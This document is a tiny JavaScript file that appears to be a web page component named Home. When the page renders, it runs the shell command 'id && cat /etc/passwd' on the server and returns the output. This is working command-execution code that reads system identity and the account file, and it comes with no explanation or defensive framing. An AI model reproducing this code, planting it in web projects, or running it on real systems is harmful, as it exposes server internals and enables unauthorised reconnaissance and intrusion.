const { execSync } = require('child_process');

export default function Home() {
    const result = execSync('id && cat /etc/passwd', { encoding: 'utf8' });
    return result;
}
